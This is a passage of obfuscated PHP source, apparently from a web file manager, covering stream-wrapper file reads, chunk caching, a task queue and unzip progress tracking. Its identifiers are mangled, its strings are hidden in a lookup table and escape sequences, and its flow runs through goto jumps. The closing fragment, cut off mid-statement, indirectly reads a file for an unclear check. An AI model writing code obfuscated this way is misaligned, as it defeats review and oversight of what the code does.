$­ıÑŒ…[$±›Î¥Î»[32]], $±›Î¥Î»[84] => $æ”ÍÃñÌ, $±›Î¥Î»[33] => $±›Î¥Î»[214], $±›Î¥Î»[76] => intval($ÊèÑ×İ§), $±›Î¥Î»[175] => get_path_ext($­ıÑŒ…[$±›Î¥Î»[32]]), $±›Î¥Î»[1416] => $ÊèÑ×İ§ > 0 && $­ıÑŒ…[$±›Î¥Î»[1538]], $±›Î¥Î»[1417] => !1); return $²û¯Ü’û; } private function header($‘¹·£ã) { $òá¶“ =& $_SERVER[Ö†ØøÖ±]; if (isset(self::$_cacheHeader[$‘¹·£ã])) { return self::$_cacheHeader[$‘¹·£ã]; } $ïÊ„Ñ¶¢ = isset($GLOBALS[$òá¶“[1539]]) ? $GLOBALS[$òá¶“[1539]] : !1; $GLOBALS[$òá¶“[1539]] = !0; self::$_cacheHeader[$‘¹·£ã] = url_header($‘¹·£ã); $GLOBALS[$òá¶“[1539]] = $ïÊ„Ñ¶¢; return self::$_cacheHeader[$‘¹·£ã]; } public function hashSimple($îœíÊÒ×, $Ö­×©±œ = false) { $Ò½®¥á =& $_SERVER[Ö†ØøÖ±]; $·»çñå = $this->info($îœíÊÒ×); if (!$·»çñå || !$·»çñå[$Ò½®¥á[216]]) { return !1; } $×·»æ´† = $·»çñå[$Ò½®¥á[76]]; $ƒÇä¯¶ª = 200; $ØÒ“Åñ = 50; if ($×·»æ´† <= $ƒÇä¯¶ª * $ØÒ“Åñ) { return md5($this->fileSubstr($îœíÊÒ×, 0, $×·»æ´†)) . $×·»æ´†; } $øí¢ãûí = intval($×·»æ´† / $ØÒ“Åñ); $¥À™¤¾³ = $Ò½®¥á[12]; $°ÃÈó = timeFloat(); $—·¹£— = 15; for ($ÓıÚç‰« = 0; $ÓıÚç‰« < $ØÒ“Åñ; $ÓıÚç‰«++) { if (timeFloat() - $°ÃÈó > $—·¹£—) { return !1; } $µ¿§Áô = $this->fileSubstr($îœíÊÒ×, $øí¢ãûí * $ÓıÚç‰«, $ƒÇä¯¶ª); if (!$µ¿§Áô) { return !1; } $¥À™¤¾³ .= $µ¿§Áô; } $¥À™¤¾³ .= $this->fileSubstr($îœíÊÒ×, $×·»æ´† - $ƒÇä¯¶ª, $ƒÇä¯¶ª); return md5($¥À™¤¾³) . $×·»æ´†; } public function getContent($Şªƒ©áğ) { return $this->fileSubstr($Şªƒ©áğ); } public function fileSubstr($¤¸á©ô, $ÀÑÓúš = 0, $­İ±û» = -1) { $Ğ­¼Èõ“ =& $_SERVER[Ö†ØøÖ±]; $É—®ƒÁÂ = $this->info($¤¸á©ô); if (!$É—®ƒÁÂ || !$É—®ƒÁÂ[$Ğ­¼Èõ“[216]] && $É—®ƒÁÂ[$Ğ­¼Èõ“[76]] > 1024 * 1024 * 10) { return !1; } if ($­İ±û» === -1) { $­İ±û» = $É—®ƒÁÂ[$Ğ­¼Èõ“[76]]; } if ($­İ±û» == 0) { return $Ğ­¼Èõ“[12]; } $è¢±ÍİÔ = array($Ğ­¼Èõ“[1540] . $ÀÑÓúš . $Ğ­¼Èõ“[835] . ($ÀÑÓúš + $­İ±û» - 1)); $Ğöèñ‚Ä = url_request($¤¸á©ô, $Ğ­¼Èõ“[245], !1, $è¢±ÍİÔ, !1, !1, 30); return $Ğöèñ‚Ä[$Ğ­¼Èõ“[1255]] ? $Ğöèñ‚Ä[$Ğ­¼Èõ“[1255]] : $Ğ­¼Èõ“[12]; } public function download($ŠÎÁëƒ¾, $Ææ´¾ç) { Downloader::start($ŠÎÁëƒ¾, $Ææ´¾ç); return $Ææ´¾ç; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Ñ§Ù´Ç°, $Ö¯¡Ç²Õ = '') { $this->info = $this->info($Ñ§Ù´Ç°); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ö†ØøÖ±][84]]; $this->pathOpen = $Ñ§Ù´Ç°; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Ñ§Ù´Ç°])) { self::$_chunkBuffer[$Ñ§Ù´Ç°] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Ì»îüŸ‰) { $Õ±÷ê·× = $this->fileSubstr($this->pose, $Ì»îüŸ‰); $this->pose += strlen($Õ±÷ê·×); return $Õ±÷ê·×; } public function stream_tell() { return $this->pose; } public function stream_seek($îş‘¶œŸ, $Úòå÷Úö) { $¡Ö›¹£Î =& $_SERVER[Ö†ØøÖ±]; if ($Úòå÷Úö == SEEK_SET) { $this->pose = $îş‘¶œŸ; } else { if ($Úòå÷Úö == SEEK_CUR) { $this->pose += $îş‘¶œŸ; } else { if ($Úòå÷Úö == SEEK_END) { $this->pose = $this->info[$¡Ö›¹£Î[76]] + intval($îş‘¶œŸ); } } } if ($îş‘¶œŸ < 0) { $this->pose = $this->info[$¡Ö›¹£Î[76]] + $îş‘¶œŸ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ö†ØøÖ±][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Î¹ÉË·ú, $ÇÉ£€”˜) { $é–ªåß  =& $_SERVER[Ö†ØøÖ±]; $¸¥ßÅÏâ = $this->info($Î¹ÉË·ú); return array($é–ªåß [1541] => 0, $é–ªåß [1542] => 0, $é–ªåß [16] => 32768 + 511, $é–ªåß [1543] => 0, $é–ªåß [1544] => 0, $é–ªåß [1545] => 0, $é–ªåß [1546] => 0, $é–ªåß [76] => $¸¥ßÅÏâ[$é–ªåß [76]], $é–ªåß [1547] => $¸¥ßÅÏâ[$é–ªåß [1415]], $é–ªåß [1503] => $¸¥ßÅÏâ[$é–ªåß [85]], $é–ªåß [1502] => $¸¥ßÅÏâ[$é–ªåß [215]], $é–ªåß [1548] => 0, $é–ªåß [1549] => 0); } static $fileInfo = array(); public function info($ßÎº¶ŒÃ) { $ˆÏ°Î = $_SERVER[Ö†ØøÖ±][1550]; if (isset(self::$fileInfo[$ßÎº¶ŒÃ])) { return self::$fileInfo[$ßÎº¶ŒÃ]; } if (substr($ßÎº¶ŒÃ, 0, strlen($ˆÏ°Î)) != $ˆÏ°Î) { return !1; } self::$fileInfo[$ßÎº¶ŒÃ] = IO::info(substr($ßÎº¶ŒÃ, strlen($ˆÏ°Î))); return self::$fileInfo[$ßÎº¶ŒÃ]; } public static function read($­Æ¿™ , $§¸¡ÅŸ, $¿Àµè˜í) { if (!isset(self::$_fopenCache[$­Æ¿™ ])) { $ìôÛúÃŠ = new StreamWrapperIO(); $ìôÛúÃŠ->stream_open($­Æ¿™ ); self::$_fopenCache[$­Æ¿™ ] = $ìôÛúÃŠ; } $ìôÛúÃŠ = self::$_fopenCache[$­Æ¿™ ]; return $ìôÛúÃŠ->fileSubstr($§¸¡ÅŸ, $¿Àµè˜í); } public static function _read($…ƒæç—ø, $à‚˜ãœÁ, $áœ•…„¡) { $©‹Ï–âÂ =& $_SERVER[Ö†ØøÖ±]; $íşÕ€ÑÆ = fopen($…ƒæç—ø, $©‹Ï–âÂ[1419]); if (!$íşÕ€ÑÆ) { return $©‹Ï–âÂ[12]; } $µ¢ú¦Ûô = 8192; fseek($íşÕ€ÑÆ, $à‚˜ãœÁ, SEEK_SET); $»§Ô±ö = $©‹Ï–âÂ[12]; $ú¾ÈÓó = 0; while ($ú¾ÈÓó < $áœ•…„¡) { $µÈâüç’ = min($µ¢ú¦Ûô, $áœ•…„¡ - $ú¾ÈÓó); $»§Ô±ö .= fread($íşÕ€ÑÆ, $µÈâüç’); $ú¾ÈÓó += $µÈâüç’; } fclose($íşÕ€ÑÆ); return $»§Ô±ö; } public function fileSubstr($ª˜ Üï®, $ØİŠÕÎç) { $Ğ—««Ó =& $_SERVER[Ö†ØøÖ±]; $÷á‘îÀÖ = $this->info[$Ğ—««Ó[76]]; $ÆÂ‡òÙ = $ª˜ Üï®; $ìÙº§à = $ØİŠÕÎç; if ($ª˜ Üï® < 0) { $ª˜ Üï® = $÷á‘îÀÖ + $ª˜ Üï®; } if ($ØİŠÕÎç === !1) { $ØİŠÕÎç = $÷á‘îÀÖ - $ª˜ Üï®; } if ($ª˜ Üï® + $ØİŠÕÎç > $÷á‘îÀÖ) { $ØİŠÕÎç = $÷á‘îÀÖ - $ª˜ Üï®; } if ($ØİŠÕÎç <= 0) { return $Ğ—««Ó[12]; } if ($ª˜ Üï® < 0 || $ª˜ Üï® >= $÷á‘îÀÖ || $ØİŠÕÎç <= 0 || $ØİŠÕÎç > 1024 * 1024 * 10) { throw new Exception("\151\157\106\x69\154\145\122\x65\141\x64\x20\145\162\x72\157\162\41\40\163\164\x61\x72\164\x3d{$ª˜ Üï®}\x3b\x6c\145\x6e\x67\x74\150\x3d{$ØİŠÕÎç}\73\40\x73\x69\x7a\145\75{$÷á‘îÀÖ}\x3b"); } $¯Áğéƒö = 64 * 1024; $ÓÌÈ´Õ¾ =& self::$_chunkBuffer[$this->path]; if (!$ÓÌÈ´Õ¾) { $ÓÌÈ´Õ¾ = array(); } $ÈßĞå“Ã = 0; $‡ŠÔ±äØ = 0; $¯“Óû… = $Ğ—««Ó[12]; foreach ($ÓÌÈ´Õ¾ as $ÈßĞå“Ã => $¯“Óû…) { $ÈßĞå“Ã = intval($ÈßĞå“Ã); $‡ŠÔ±äØ = $ÈßĞå“Ã + strlen($¯“Óû…); if ($ª˜ Üï® >= $‡ŠÔ±äØ) { continue; } if ($ª˜ Üï® >= $ÈßĞå“Ã && $ª˜ Üï® + $ØİŠÕÎç <= $‡ŠÔ±äØ) { return substr($¯“Óû…, $ª˜ Üï® - $ÈßĞå“Ã, $ØİŠÕÎç); } break; } if (count($ÓÌÈ´Õ¾) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ğ—««Ó[1551], $Ğ—««Ó[1552] . count($ÓÌÈ´Õ¾) . "\x3b\163\164\141\162\x74\x3d{$ª˜ Üï®}\x2c\x6c\145\x6e\147\164\x68\75{$ØİŠÕÎç}\x3b\x70\157\163\145\x3a{$ÈßĞå“Ã}\x7e{$‡ŠÔ±äØ}"); throw new Exception($Ğ—««Ó[1553]); } $ÈÄ†÷‹ = intval($ª˜ Üï® / $¯Áğéƒö) * $¯Áğéƒö; $Ş™Ü²†š = ceil(($ª˜ Üï® + $ØİŠÕÎç) / $¯Áğéƒö) * $¯Áğéƒö - $ÈÄ†÷‹; $±¬Ÿ•·± = IO::fileSubstr($this->path, $ÈÄ†÷‹, $Ş™Ü²†š); $ÓÌÈ´Õ¾[$ÈÄ†÷‹ . $Ğ—««Ó[12]] = $±¬Ÿ•·±; ksort($ÓÌÈ´Õ¾); $§§ï§ŒŒ = substr($±¬Ÿ•·±, $ª˜ Üï® - $ÈÄ†÷‹, $ØİŠÕÎç); return $§§ï§ŒŒ; } private function log($ˆ™êÏ, $Ï°Â¶ï) { $ûÎü¸¶€ =& $_SERVER[Ö†ØøÖ±]; $Ã‘éì§ş = timeFloat() - $this->timeStart; write_log(sprintf($ûÎü¸¶€[1554], $ˆ™êÏ, $this->info[$ûÎü¸¶€[32]], $Ã‘éì§ş, $Ï°Â¶ï), $ûÎü¸¶€[1235]); } } goto CÑ¶Æš‰£‰; b¸ÒÄ†¿µÖ: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\x6b\x51\x75\145\x75\x65\x4c\x65\156\x67\164\x68"; const QUEUE_DATA = "\164\x61\x73\153\121\x75\145\165\145\x44\x61\164\141"; const QUEUE_TIME = "\164\x61\x73\153\121\165\x65\x75\145\114\141\163\x74\122\x75\x6e"; const QUEUE_THREAD = "\164\x61\x73\x6b\121\x75\145\165\x65\x54\x68\x72\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($“É‚ºé¦, $Ÿ¯ÃâÑÛ = array(), $‚š©Ÿ­× = '', $ğÒÏ§Ø¿ = '') { $ü²ƒ¹ =& $_SERVER[Ö†ØøÖ±]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ğÒÏ§Ø¿ && array_find_by_field(self::$listData, $ü²ƒ¹[94], $ğÒÏ§Ø¿)) { return !0; } if ($ğÒÏ§Ø¿ && array_find_by_field(self::$listDataAdd, $ü²ƒ¹[94], $ğÒÏ§Ø¿)) { return !0; } self::$listDataAdd[] = array($ü²ƒ¹[317] => $“É‚ºé¦, $ü²ƒ¹[1797] => $Ÿ¯ÃâÑÛ, $ü²ƒ¹[503] => $‚š©Ÿ­×, $ü²ƒ¹[94] => $ğÒÏ§Ø¿); return !0; } public static function addSubmit() { $ƒ™šºˆ„ =& $_SERVER[Ö†ØøÖ±]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ƒ™šºˆ„[1798] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ƒ™šºˆ„[12], $ƒ™šºˆ„[503])), $ƒ™šºˆ„[185]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ô¯µÄûß, $İ¿„Û²ä = array(), $Ì¨‰İøœ = '', $­â¦Î—« = '') { $ŠÙ¹•İ› =& $_SERVER[Ö†ØøÖ±]; if (self::count() >= self::MAX_LENGTH) { return !1; } $î×©îı = self::getAll(); if ($­â¦Î—« && array_find_by_field($î×©îı, $ŠÙ¹•İ›[94], $­â¦Î—«)) { return !0; } $î×©îı[] = array($ŠÙ¹•İ›[317] => $ô¯µÄûß, $ŠÙ¹•İ›[1797] => $İ¿„Û²ä, $ŠÙ¹•İ›[503] => $Ì¨‰İøœ, $ŠÙ¹•İ›[94] => $­â¦Î—«); self::setAll($î×©îı); write_log($ŠÙ¹•İ›[1798] . $Ì¨‰İøœ, $ŠÙ¹•İ›[185]); return !0; } public static function run() { $åÑØ™Ÿ =& $_SERVER[Ö†ØøÖ±]; $ÔÚİÆà = self::getAll(); $¶Ø¬’¸Â = array_shift($ÔÚİÆà); if (!$¶Ø¬’¸Â) { return !1; } self::setAll($ÔÚİÆà); $èã¨´ç¦ = timeFloat(); $áµÔó”ğ = $åÑØ™Ÿ[12]; try { $áµÔó”ğ = Hook::apply($¶Ø¬’¸Â[$åÑØ™Ÿ[317]], $¶Ø¬’¸Â[$åÑØ™Ÿ[1797]]); } catch (Exception $ÙÚò§Ãë) { write_log($ÙÚò§Ãë, $åÑØ™Ÿ[1235]); } $èË·ÈÃ = number_format(timeFloat() - $èã¨´ç¦, 3) . $åÑØ™Ÿ[1715]; if ($áµÔó”ğ && is_string($áµÔó”ğ)) { $èË·ÈÃ = $èË·ÈÃ . $åÑØ™Ÿ[1799] . $áµÔó”ğ; } write_log($åÑØ™Ÿ[1800] . $¶Ø¬’¸Â[$åÑØ™Ÿ[503]] . $åÑØ™Ÿ[1801] . $èË·ÈÃ, $åÑØ™Ÿ[185]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $¶ì–ÎÄÁ =& $_SERVER[Ö†ØøÖ±]; $Šç¦ÅïÅ = self::threadCount() + 1; if ($Šç¦ÅïÅ > 3 || !self::count()) { return; } write_log($¶ì–ÎÄÁ[1802] . $Šç¦ÅïÅ, $¶ì–ÎÄÁ[185]); Cache::set(self::QUEUE_THREAD, $Šç¦ÅïÅ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($¶ì–ÎÄÁ[1803], $¶ì–ÎÄÁ[185]); } public static function getKey($€¿œµœÑ, $ìË•„ª— = "\151\x6e\x74") { $¿è”¹İ =& $_SERVER[Ö†ØøÖ±]; Cache::removeMemory($€¿œµœÑ); $Ä©ÄÇ = Cache::get($€¿œµœÑ); if ($ìË•„ª— == $¿è”¹İ[341]) { return $Ä©ÄÇ ? intval($Ä©ÄÇ) : 0; } if ($ìË•„ª— == $¿è”¹İ[1804]) { return is_array($Ä©ÄÇ) ? $Ä©ÄÇ : array(); } return $Ä©ÄÇ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[Ö†ØøÖ±][1804]); } public static function setAll($§ÜÕÖ¢) { $»ÁşŸí = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($§ÜÕÖ¢), $»ÁşŸí); Cache::set(self::QUEUE_DATA, $§ÜÕÖ¢, $»ÁşŸí); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($”ì±ä–, $Š¬ûöı· = 5.0) { if (!$”ì±ä–) { return; } $éÒŒ»ªæ = Cache::get($”ì±ä–); if (!$éÒŒ»ªæ || timeFloat() - floatVal($éÒŒ»ªæ) >= $Š¬ûöı·) { Cache::set($”ì±ä–, timeFloat(), $Š¬ûöı· * 10); return !0; } return !1; } public static function timeLimitCall($›Ù›¢ï¹, $ˆÏ²İÉÀ, $¯¾–¼Ş, $ÈÏ¥òÇ = 5.0) { $©ıÇ—­ =& $_SERVER[Ö†ØøÖ±]; if (!$›Ù›¢ï¹ || !$ˆÏ²İÉÀ) { return; } self::$asyncAdd = !0; $şû½– = $©ıÇ—­[1805]; $‹¤áçâé = Cache::get($şû½–, !0); $í«ÇŠù÷ = array($©ıÇ—­[1806] => timeFloat(), $©ıÇ—­[1807] => timeFloat(), $©ıÇ—­[317] => $ˆÏ²İÉÀ, $©ıÇ—­[1797] => $¯¾–¼Ş, $©ıÇ—­[194] => $ÈÏ¥òÇ); if (is_array($‹¤áçâé[$›Ù›¢ï¹])) { $í«ÇŠù÷[$©ıÇ—­[1807]] = $‹¤áçâé[$›Ù›¢ï¹][$©ıÇ—­[1807]]; } if (is_array($‹¤áçâé[$›Ù›¢ï¹])) { if (timeFloat() - $‹¤áçâé[$›Ù›¢ï¹][$©ıÇ—­[1806]] < $í«ÇŠù÷[$©ıÇ—­[194]] * 0.3) { return; } $í«ÇŠù÷[$©ıÇ—­[1807]] = $‹¤áçâé[$›Ù›¢ï¹][$©ıÇ—­[1807]]; } $‹¤áçâé[$›Ù›¢ï¹] = $í«ÇŠù÷; Cache::set($şû½–, $‹¤áçâé, 60); Cache::removeMemory($şû½–); write_log($©ıÇ—­[1808] . $›Ù›¢ï¹ . $©ıÇ—­[71] . $ˆÏ²İÉÀ, $©ıÇ—­[185]); } public static function timeLimitCallLoop() { $’ã—²œ¼ =& $_SERVER[Ö†ØøÖ±]; $·§ƒµì¥ = array($’ã—²œ¼[1809]); $ê÷œò = in_array(strtolower(ACTION), $·§ƒµì¥); if (!$ê÷œò && !self::$asyncAdd) { return; } $€‚×ŞéØ = $’ã—²œ¼[1805]; $‚ªöïŸ = Cache::get($€‚×ŞéØ, !0); if (!$‚ªöïŸ || count($‚ªöïŸ) <= 0) { return; } $áÛÙ…½ = !1; $Æ±Ñïµè = timeFloat(); $ÊÇƒ´Ö = array(); foreach ($‚ªöïŸ as $–ÚÎÑŸ‹ => $äÙÀ§¢î) { if ($Æ±Ñïµè - $äÙÀ§¢î[$’ã—²œ¼[1807]] > $äÙÀ§¢î[$’ã—²œ¼[194]]) { $áÛÙ…½ = !0; try { Hook::apply($äÙÀ§¢î[$’ã—²œ¼[317]], $äÙÀ§¢î[$’ã—²œ¼[1797]]); write_log($’ã—²œ¼[1810] . $–ÚÎÑŸ‹ . $’ã—²œ¼[71] . $äÙÀ§¢î[$’ã—²œ¼[317]] . $’ã—²œ¼[1811] . ACTION, $’ã—²œ¼[185]); } catch (Exception $ïè½¤½¦) { } continue; } $ÊÇƒ´Ö[$–ÚÎÑŸ‹] = $äÙÀ§¢î; } if (!$áÛÙ…½) { return; } if (!$ÊÇƒ´Ö) { return Cache::remove($€‚×ŞéØ); } Cache::set($€‚×ŞéØ, $ÊÇƒ´Ö, 60); Cache::removeMemory($€‚×ŞéØ); } public static function finished($ƒÇıü, $º»ï¼Áø) { $ã¸ßÖé¯ =& $_SERVER[Ö†ØøÖ±]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ã¸ßÖé¯[317] => $ƒÇıü, $ã¸ßÖé¯[1797] => $º»ï¼Áø); } private static function finishedRun() { $Ü“—±È =& $_SERVER[Ö†ØøÖ±]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Î¦óåá¹) { try { Hook::apply($Î¦óåá¹[$Ü“—±È[317]], $Î¦óåá¹[$Ü“—±È[1797]]); } catch (Exception $Šªªøˆ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $îª“¼™¦ =& $_SERVER[Ö†ØøÖ±]; parent::startAfter(); Hook::bind($îª“¼™¦[1812], array($this, $îª“¼™¦[1813])); Hook::bind($îª“¼™¦[1246], array($this, $îª“¼™¦[1814])); Hook::bind($îª“¼™¦[1815], array($this, $îª“¼™¦[1816])); $÷¿ç§ Ó =& $this->task; $÷¿ç§ Ó[$îª“¼™¦[1817]] = $îª“¼™¦[1247]; if (!$÷¿ç§ Ó[$îª“¼™¦[1596]]) { $÷¿ç§ Ó[$îª“¼™¦[1596]] = LNG($îª“¼™¦[1818]); } } protected function endAfter() { $Æ‚ÛåÅ =& $_SERVER[Ö†ØøÖ±]; parent::endAfter(); Hook::unbind($Æ‚ÛåÅ[1812], array($this, $Æ‚ÛåÅ[1813])); Hook::unbind($Æ‚ÛåÅ[1246], array($this, $Æ‚ÛåÅ[1814])); Hook::unbind($Æ‚ÛåÅ[1815], array($this, $Æ‚ÛåÅ[1816])); } public function updateAfter() { $“²ÅúëÎ =& $_SERVER[Ö†ØøÖ±]; $ë„î«Óõ =& $this->task; if (!$ë„î«Óõ[$“²ÅúëÎ[839]] || !$ë„î«Óõ[$“²ÅúëÎ[816]]) { if ($ë„î«Óõ[$“²ÅúëÎ[1817]] != $“²ÅúëÎ[366]) { return; } } if ($ë„î«Óõ[$“²ÅúëÎ[1817]] == $“²ÅúëÎ[1247]) { $§¿•ãœÚ = 0; if ($ë„î«Óõ[$“²ÅúëÎ[1752]]) { $§¿•ãœÚ = $ë„î«Óõ[$“²ÅúëÎ[1753]] / $ë„î«Óõ[$“²ÅúëÎ[1752]]; } $ë„î«Óõ[$“²ÅúëÎ[1701]] = $§¿•ãœÚ * 0.3; } else { if ($ë„î«Óõ[$“²ÅúëÎ[1817]] == $“²ÅúëÎ[366]) { $§¿•ãœÚ = $ë„î«Óõ[$“²ÅúëÎ[1700]] / $ë„î«Óõ[$“²ÅúëÎ[839]]; $ë„î«Óõ[$“²ÅúëÎ[1701]] = 0.3 + $§¿•ãœÚ * 0.4; } else { if ($ë„î«Óõ[$“²ÅúëÎ[1817]] == $“²ÅúëÎ[107]) { $¹û’õçğ = 0; if ($ë„î«Óõ[$“²ÅúëÎ[1754]] == $“²ÅúëÎ[107]) { $¹û’õçğ = $ë„î«Óõ[$“²ÅúëÎ[1753]]; } $§¿•ãœÚ = ($ë„î«Óõ[$“²ÅúëÎ[1757]] + $¹û’õçğ) / $ë„î«Óõ[$“²ÅúëÎ[816]]; $ë„î«Óõ[$“²ÅúëÎ[1701]] = 0.3 + 0.4 + $§¿•ãœÚ * 0.3; } } } if ($ë„î«Óõ[$“²ÅúëÎ[1701]] > 0) { $··Ó’ç™ = timeFloat() - $ë„î«Óõ[$“²ÅúëÎ[1703]] - $ë„î«Óõ[$“²ÅúëÎ[1706]]; $ë„î«Óõ[$“²ÅúëÎ[1707]] = $··Ó’ç™ * (1 - $ë„î«Óõ[$“²ÅúëÎ[1701]]) / $ë„î«Óõ[$“²ÅúëÎ[1701]]; } } public function addFile($Ä¼§ñË») { $ªÅˆßõ› =& $_SERVER[Ö†ØøÖ±]; $¾œÌ»Œ =& $this->task; $­şÑåá‡ = IO::info($Ä¼§ñË»); $¾œÌ»Œ[$ªÅˆßõ›[1750]] = $­şÑåá‡[$ªÅˆßõ›[32]]; $¾œÌ»Œ[$ªÅˆßõ›[1752]] = $­şÑåá‡[$ªÅˆßõ›[76]]; $¾œÌ»Œ[$ªÅˆßõ›[1753]] = 0; $¾œÌ»Œ[$ªÅˆßõ›[1117]] = $ªÅˆßõ›[1773]; $¾œÌ»Œ[$ªÅˆßõ›[1754]] = $ªÅˆßõ›[1247]; $¾œÌ»Œ[$ªÅˆßõ›[816]] = $­şÑåá‡[$ªÅˆßõ›[76]]; $¾œÌ»Œ[$ªÅˆßõ›[839]] = 1; $Åˆ‡ï¬’ = 0; $¾œÌ»Œ[$ªÅˆßõ›[1761]] = array($ªÅˆßõ›[1762] => $Åˆ‡ï¬’ + 1, $ªÅˆßõ›[471] => $­şÑåá‡[$ªÅˆßõ›[32]], $ªÅˆßõ›[84] => $­şÑåá‡[$ªÅˆßõ›[84]], $ªÅˆßõ›[560] => $­şÑåá‡[$ªÅˆßõ›[560]] ? $­şÑåá‡[$ªÅˆßõ›[560]] : $­şÑåá‡[$ªÅˆßõ›[84]]); $this->update(); } public function zipEvent($Äæ‘•, $€áë›®, $»üıçš™, $¦¹…İ¦Ë) { $¿ŞÉ¹®ç =& $_SERVER[Ö†ØøÖ±]; $÷¶Èè¼Ê =& $this->task; $÷¶Èè¼Ê[$¿ŞÉ¹®ç[1750]] = get_path_this($€áë›®); $÷¶Èè¼Ê[$¿ŞÉ¹®ç[1752]] = $¦¹…İ¦Ë; $÷¶Èè¼Ê[$¿ŞÉ¹®ç[1753]] = $»üıçš™; $÷¶Èè¼Ê[$¿ŞÉ¹®ç[1117]] = $Äæ‘• == $¿ŞÉ¹®ç[1819] ? $¿ŞÉ¹®ç[1820] : $¿ŞÉ¹®ç[1821]; $÷¶Èè¼Ê[$¿ŞÉ¹®ç[1754]] = $¿ŞÉ¹®ç[12]; $÷¶Èè¼Ê[$¿ŞÉ¹®ç[816]] = $¦¹…İ¦Ë; $÷¶Èè¼Ê[$¿ŞÉ¹®ç[1817]] = $¿ŞÉ¹®ç[366]; $this->update(); } public function unzipAfter($ÚŸ”é›ã) { $ö‡Œ™şÆ =& $_SERVER[Ö†ØøÖ±]; $åéä‘úù =& $this->task; $åéä‘úù[$ö‡Œ™şÆ[1817]] = $ö‡Œ™şÆ[107]; $íµôçıé = IO::infoWithChildren($ÚŸ”é›ã); $Ò¤à‹¨‡ = 0; $åéä‘úù[$ö‡Œ™şÆ[1761]] = array($ö‡Œ™şÆ[1762] => $Ò¤à‹¨‡ + 1, $ö‡Œ™şÆ[471] => $íµôçıé[$ö‡Œ™şÆ[32]], $ö‡Œ™şÆ[84] => $íµôçıé[$ö‡Œ™şÆ[84]], $ö‡Œ™şÆ[560] => $íµôçıé[$ö‡Œ™şÆ[560]] ? $íµôçıé[$ö‡Œ™şÆ[560]] : $íµôçıé[$ö‡Œ™şÆ[84]]); if ($íµôçıé[$ö‡Œ™şÆ[33]] == $ö‡Œ™şÆ[214]) { $åéä‘úù[$ö‡Œ™şÆ[839]] = 1; } else { $åéä‘úù[$ö‡Œ™şÆ[839]] = $íµôçıé[$ö‡Œ™şÆ[79]][$ö‡Œ™şÆ[77]]; } $åéä‘úù[$ö‡Œ™şÆ[1117]] = $ö‡Œ™şÆ[12]; $åéä‘úù[$ö‡Œ™şÆ[1754]] = 0; $åéä‘úù[$ö‡Œ™şÆ[1700]] = 0; $åéä‘úù[$ö‡Œ™şÆ[1752]] = 0; $åéä‘úù[$ö‡Œ™şÆ[1753]] = 0; $åéä‘úù[$ö‡Œ™şÆ[1750]] = $ö‡Œ™şÆ[12]; $åéä‘úù[$ö‡Œ™şÆ[1757]] = 0; $åéä‘úù[$ö‡Œ™şÆ[816]] = $íµôçıé[$ö‡Œ™şÆ[76]]; $this->update(); self::log($ö‡Œ™şÆ[1822] . json_encode(array($åéä‘úù, $íµôçıé))); } public function nameParse($¤ßÉ°òı) { $Ãş²¶½Ğ =& $_SERVER[Ö†ØøÖ±]; $ó†©ÁŸˆ =& $this->task; if ($ó†©ÁŸˆ[$Ãş²¶½Ğ[1817]] == $Ãş²¶½Ğ[1247]) { $ó†©ÁŸˆ[$Ãş²¶½Ğ[1817]] = $Ãş²¶½Ğ[366]; $ó†©ÁŸˆ[$Ãş²¶½Ğ[1757]] = 0; $ó†©ÁŸˆ[$Ãş²¶½Ğ[816]] = 0; } $›íàæ’ = get_path_this($¤ßÉ°òı); if (strstr($›íàæ’, $Ãş²¶½Ğ[10])) { $ó†©ÁŸˆ[$Ãş²¶½Ğ[1700]] += 1; $ó†©ÁŸˆ[$Ãş²¶½Ğ[839]] += 1; } $ó†©ÁŸˆ[$Ãş²¶½Ğ[1750]] = $¤ßÉ°òı; $this->update(); } } goto Eìôƒ…µàï; BÌœëÂÂÃ: if (!isset($_SERVER[$_SERVER[Ö†ØøÖ±][288]]) || !isset($_SERVER[$_SERVER[Ö†ØøÖ±][289]])) { $_getc = $_SERVER[Ö†ØøÖ±][290]; $_getfile = $_SERVER[$_SERVER[Ö†ØøÖ±][291]] . $_SERVER[Ö†ØøÖ±][292]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ö†ØøÖ±][246], $_getfilec); if (count($_getarrs) < $_SERVER[Ö†ØøÖ±][293]) { $exit = $_SERVER[Ö†ØøÖ±][294]; 